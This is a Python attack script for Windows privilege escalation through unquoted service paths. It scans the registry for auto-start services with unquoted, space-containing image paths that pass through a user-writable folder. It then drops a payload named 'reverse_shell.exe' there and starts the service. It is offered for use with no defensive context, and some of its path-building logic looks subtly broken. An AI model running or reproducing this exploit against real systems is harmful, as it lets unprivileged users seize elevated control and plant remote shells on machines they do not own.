import winreg
import os
import subprocess
import ctypes
import shutil

# Replace this with your payload path (must be a compiled exe)
PAYLOAD_SOURCE = "reverse_shell.exe"

def is_user_writable(path):
    try:
        test_file = os.path.join(path, 'test.txt')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        return True
    except:
        return False

def get_unquoted_services():
    services = []
    reg_path = r"SYSTEM\CurrentControlSet\Services"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as hkey:
            for i in range(winreg.QueryInfoKey(hkey)[0]):
                service_name = winreg.EnumKey(hkey, i)
                try:
                    with winreg.OpenKey(hkey, service_name) as sk:
                        image_path, _ = winreg.QueryValueEx(sk, "ImagePath")
                        start_mode, _ = winreg.QueryValueEx(sk, "Start")
                        if '"' not in image_path and ' ' in image_path and start_mode == 2:
                            parts = image_path.strip().split(" ")
                            test_path = ''
                            for part in parts[:-1]:
                                test_path = os.path.join(test_path, part) if test_path else part
                                if os.path.isdir(test_path) and is_user_writable(test_path):
                                    services.append((service_name, image_path, test_path))
                                    break
                except:
                    continue
    except:
        pass
    return services

def deploy_payload(target_path, exe_name):
    target_file = os.path.join(target_path, exe_name)
    try:
        shutil.copy2(PAYLOAD_SOURCE, target_file)
        print(f"[+] Payload copied to: {target_file}")
        return True
    except Exception as e:
        print(f"[-] Failed to deploy payload: {e}")
        return False

def try_start_service(service_name):
    try:
        subprocess.run(["sc", "start", service_name], capture_output=True)
        print(f"[+] Attempted to start service: {service_name}")
    except Exception as e:
        print(f"[-] Failed to start service: {e}")

def main():
    print("[*] Scanning for exploitable services...")
    candidates = get_unquoted_services()
    if not candidates:
        print("[-] No exploitable unquoted service paths found.")
        return

    for svc_name, image_path, writable_dir in candidates:
        print(f"\n[+] Found vulnerable service: {svc_name}")
        print(f"    Path: {image_path}")
        print(f"    Writable folder: {writable_dir}")

        # Figure out the expected name of the .exe to drop
        exe_name = os.path.basename(image_path.split(' ')[0])  # e.g., MyApp.exe

        if deploy_payload(writable_dir, exe_name):
            try_start_service(svc_name)

if __name__ == "__main__":
    print("[!] This script must be run as a regular user with write access to a vulnerable path.")
    main()
